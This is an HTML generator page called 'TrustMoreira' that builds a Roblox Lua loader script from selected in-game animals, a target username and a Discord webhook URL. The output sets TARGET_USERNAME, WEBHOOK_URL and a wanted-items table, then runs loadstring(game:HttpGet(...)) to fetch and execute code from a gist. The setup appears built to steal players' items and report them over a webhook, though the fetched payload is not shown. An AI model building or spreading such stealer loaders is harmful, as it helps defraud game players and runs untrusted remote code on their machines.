<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Vinnhub | TrustMoreira</title>
<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<style>
  /* Your existing CSS theme here */
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  :root { --bg: #080a0e; --surface: #0f1117; --panel: #13161f; --border: #1c2130; --accent: #00e5ff; --purple: #a78bfa; --discord: #5865f2; --green: #10b981; --danger: #f43f5e; --text: #dde4f0; --muted: #4a5568; }
  body { background: var(--bg); color: var(--text); font-family: 'Rajdhani', sans-serif; min-height: 100vh; overflow-x: hidden; }
  .wrap { position: relative; z-index: 1; max-width: 920px; margin: 0 auto; padding: 2.8rem 1.5rem 6rem; }
  .panel { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; margin-bottom: 1.2rem; }
  .ph { display: flex; align-items: center; gap: .6rem; padding: .75rem 1.25rem; background: var(--surface); border-bottom: 1px solid var(--border); }
  .pb { padding: 1.25rem; }
  .txt { width: 100%; background: var(--bg); border: 1px solid var(--border); border-radius: 8px; padding: .72rem 1rem; color: var(--text); font-family: 'Share Tech Mono', monospace; outline: none; }
  .btn-gen { display: block; width: 100%; padding: .92rem; background: linear-gradient(130deg, var(--accent) 0%, #38bdf8 100%); border: none; border-radius: 10px; font-weight: 700; cursor: pointer; margin-bottom: 1.2rem; }
  .code-block { background: var(--bg); border: 1px solid var(--border); border-radius: 8px; padding: 1rem; font-family: 'Share Tech Mono', monospace; white-space: pre; overflow-x: auto; color: #7ecfe8; }
  .animal-list { background: var(--bg); border: 1px solid var(--border); height: 240px; overflow-y: auto; }
  .a-item { padding: .5rem; cursor: pointer; display: flex; gap: 10px; }
</style>
</head>
<body>
<div class="wrap">
  <header style="text-align:center; margin-bottom: 2rem;"><h1>TrustMoreira</h1></header>

  <div class="panel">
    <div class="ph"><span class="ph-title">Select Animals</span></div>
    <div class="pb"><div class="animal-list" id="animalList"></div></div>
  </div>

  <div class="panel">
    <div class="ph"><span class="ph-title">Configuration</span></div>
    <div class="pb">
      <input class="txt" id="usernameInput" type="text" placeholder="Your Roblox Username">
      <input class="txt" id="webhookInput" type="text" placeholder="Discord Webhook URL" style="margin-top:10px;">
    </div>
  </div>

  <button class="btn-gen" onclick="generate()">⚡ Generate Script</button>

  <div class="panel">
    <div class="ph"><span class="ph-title">Output</span></div>
    <div class="pb"><div class="code-block" id="outputBlock">-- Select items and hit generate</div></div>
  </div>
</div>

<script>
const ANIMALS = ["Meowl", "Skibidi Toilet", "Strawberry Elephant", "Chipso and Queso", "Chillin Chili"]; // Add your full list here
const list = document.getElementById('animalList');
let selected = new Set();

ANIMALS.forEach(name => {
  const div = document.createElement('div');
  div.className = 'a-item';
  div.innerHTML = `<input type="checkbox" value="${name}"> ${name}`;
  div.onclick = () => { selected.has(name) ? selected.delete(name) : selected.add(name); };
  list.appendChild(div);
});

function generate() {
  const user = document.getElementById('usernameInput').value;
  const web = document.getElementById('webhookInput').value;
  const items = [...selected].map(n => `    ["${n}"] = true`).join(",\n");

  const script = `getgenv().TARGET_USERNAME = "${user}"
getgenv().WEBHOOK_URL = "${web}"
getgenv().WANTED_BRAINROTS = {
${items}
}
loadstring(game:HttpGet("PASTE_YOUR_RAW_GIST_URL_HERE"))()`;

  document.getElementById('outputBlock').textContent = script;
}
</script>
</body>
</html>
